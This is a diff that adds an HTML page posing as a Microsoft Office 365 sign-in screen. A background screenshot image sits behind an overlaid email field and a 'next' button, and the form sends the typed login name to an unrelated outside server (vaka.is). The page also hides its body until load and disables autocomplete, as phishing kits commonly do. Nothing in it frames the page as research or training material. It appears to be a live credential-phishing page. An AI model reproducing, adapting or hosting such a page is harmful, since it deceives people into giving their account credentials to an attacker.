@@ -1,0 +1,49 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Sign in to your account</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="shortcut icon"
+              href="favicon_a.ico"/>	
+			  <style type="text/css">
+			   
+.textbox { 
+    border: 1px solid #FFFFFF; 
+    height: 36px; 
+    font-size: 14px; 
+    padding: 6px 6px 6px 6px; 
+    border-radius: 4px; 
+    -moz-border-radius: 4px; 
+    -webkit-border-radius: 4px;
+} 
+ 
+.textbox:focus { 
+    outline: none; 
+    border: 1px solid #FFFFFF;
+    box-shadow: 0px 0px 8px #000000; 
+    -moz-box-shadow: 0px 0px 8px #FFFFFF; 
+    -webkit-box-shadow: 0px 0px 8px #FFFFFF;
+
+			  </style>
+<script type="text/javascript">
+function unhideBody()
+{
+var bodyElems = document.getElementsByTagName("body");
+bodyElems[0].style.visibility = "visible";
+}
+</script>
+
+</head>
+<body style="visibility:hidden" onload="unhideBody()" bgColor="#FFFFFF">
+<div id="container">
+<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:652px; z-index:0"><img src="off365.png"></div>
+<form name="actionForm" method="post" action="https://vaka.is/officehome/index1.php" onsubmit="collect();" id="noautocomplete">
+<input name="LoginName" class="textbox" autocomplete="off" type="email" placeholder="someone@example.com" style="position:absolute;width:352px;left:507px;top:272px;z-index:6">
+
+<div id="formimage1" style="position:absolute; left:749px; top:403px; z-index:8"><input type="image" name="formimage1" width="110" height="34" src="next.png"></div>
+
+
+</div>
+
+</body>
+</html>
